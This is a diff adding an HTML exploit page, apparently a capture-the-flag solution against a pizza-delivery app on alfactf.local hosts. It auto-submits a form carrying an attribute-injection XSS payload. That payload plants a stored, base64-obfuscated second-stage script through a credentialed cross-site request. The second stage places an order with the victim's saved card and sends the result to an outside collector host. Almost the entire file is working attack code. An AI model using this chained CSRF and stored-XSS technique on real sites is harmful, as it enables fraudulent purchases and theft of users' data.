@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=windows-1252"></head><body>
+<form id="f" method="POST" action="http://landing.alfactf.local/api/landing/callback">
+  <input id="phone" name="phone" value="x' autofocus onfocus='(async()=&gt;{let l=&quot;&lt;/strong&gt;&lt;img src=x onerror=\&quot;eval(atob(`KGFzeW5jKCk9PnsKICBjb25zdCBqID0gciA9PiByLmpzb24oKTsKCiAgY29uc3QgY2FyZHMgPSBhd2FpdCBmZXRjaCgiL2FwaS9jYXJkcyIpLnRoZW4oaik7CiAgY29uc3QgbWVudSA9IGF3YWl0IGZldGNoKCIvYXBpL21lbnUiKS50aGVuKGopOwogIGNvbnN0IGFkZHJzID0gYXdhaXQgZmV0Y2goIi9hcGkvYWRkcmVzc2VzIikudGhlbihqKTsKCiAgY29uc3QgY2FyZCA9IGNhcmRzLmNhcmRzWzBdOwogIGNvbnN0IHBpenphID0gbWVudS5pdGVtcy5maW5kKHAgPT4gcC5uYW1lLnRvTG93ZXJDYXNlKCkgPT09ICJmbGFnIHBpenphIik7CiAgY29uc3QgYWRkciA9IGFkZHJzLmFkZHJlc3Nlc1swXTsKCiAgY29uc3QgbWFkZSA9IGF3YWl0IGZldGNoKCIvYXBpL29yZGVycyIsIHsKICAgIG1ldGhvZDogIlBPU1QiLAogICAgaGVhZGVyczogeyJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiJ9LAogICAgYm9keTogSlNPTi5zdHJpbmdpZnkoewogICAgICBhZGRyZXNzX2lkOiBhZGRyLmlkLAogICAgICBpdGVtczogW3twaXp6YV9pZDogcGl6emEuaWQsIHF1YW50aXR5OiAxfV0sCiAgICAgIHBheW1lbnRfbWV0aG9kOiAiY2FyZCIsCiAgICAgIHNhdmVkX2NhcmRfaWQ6IGNhcmQuaWQKICAgIH0pCiAgfSkudGhlbihqKTsKCiAgY29uc3QgZGV0YWlsID0gYXdhaXQgZmV0Y2goIi9hcGkvb3JkZXJzLyIgKyBtYWRlLm9yZGVyLmlkKS50aGVuKGopOwoKICBuZXcgSW1hZ2UoKS5zcmMgPSAiaHR0cDovL3NpZ21hLmFyLWlzcy5uZXQvdXBkL2V4Lmh0bWw/ZmxhZz0iICsKICAgIGVuY29kZVVSSUNvbXBvbmVudChkZXRhaWwub3JkZXIuZmxhZyB8fCBKU09OLnN0cmluZ2lmeShkZXRhaWwpKTsKfSkoKS5jYXRjaChlID0+IHsKICBuZXcgSW1hZ2UoKS5zcmMgPSAiaHR0cDovL3NpZ21hLmFyLWlzcy5uZXQvdXBkL2V4Lmh0bWw/ZXJyPSIgKwogICAgZW5jb2RlVVJJQ29tcG9uZW50KGUuc3RhY2sgfHwgZS5tZXNzYWdlIHx8IGUpOwp9KTs=`))\&quot;&gt;&quot;;await fetch(&quot;http://delivery.alfactf.local/api/addresses&quot;,{method:&quot;POST&quot;,mode:&quot;no-cors&quot;,credentials:&quot;include&quot;,headers:{&quot;Content-Type&quot;:&quot;text/plain&quot;},body:JSON.stringify({label:l,city:&quot;x&quot;,street:&quot;x&quot;,house:&quot;1&quot;})});setTimeout(()=&gt;location=&quot;http://delivery.alfactf.local/addresses&quot;,700)})()' a='">
+</form>
+
+<script>
+const DELIVERY = "http://delivery.alfactf.local";
+const COLLECT = "http://sigma.ar-iss.net/upd/ex.html";
+
+const stage2 = `
+(async()=>{
+  const j = r => r.json();
+
+  const cards = await fetch("/api/cards").then(j);
+  const menu = await fetch("/api/menu").then(j);
+  const addrs = await fetch("/api/addresses").then(j);
+
+  const card = cards.cards[0];
+  const pizza = menu.items.find(p => p.name.toLowerCase() === "flag pizza");
+  const addr = addrs.addresses[0];
+
+  const made = await fetch("/api/orders", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      address_id: addr.id,
+      items: [{pizza_id: pizza.id, quantity: 1}],
+      payment_method: "card",
+      saved_card_id: card.id
+    })
+  }).then(j);
+
+  const detail = await fetch("/api/orders/" + made.order.id).then(j);
+
+  new Image().src = "${COLLECT}?flag=" +
+    encodeURIComponent(detail.order.flag || JSON.stringify(detail));
+})().catch(e => {
+  new Image().src = "${COLLECT}?err=" +
+    encodeURIComponent(e.stack || e.message || e);
+});
+`.trim();
+
+const b64 = btoa(stage2);
+
+const storedLabel =
+  `</strong><img src=x onerror="eval(atob(\`${b64}\`))">`;
+
+const stage1 =
+  `x' autofocus onfocus='` +
+  `(async()=>{` +
+    `let l=${JSON.stringify(storedLabel)};` +
+    `await fetch("${DELIVERY}/api/addresses",{` +
+      `method:"POST",` +
+      `mode:"no-cors",` +
+      `credentials:"include",` +
+      `headers:{"Content-Type":"text/plain"},` +
+      `body:JSON.stringify({label:l,city:"x",street:"x",house:"1"})` +
+    `});` +
+    `setTimeout(()=>location="${DELIVERY}/addresses",700)` +
+  `})()` +
+  `' a='`;
+
+phone.value = stage1;
+f.submit();
+</script></body></html>
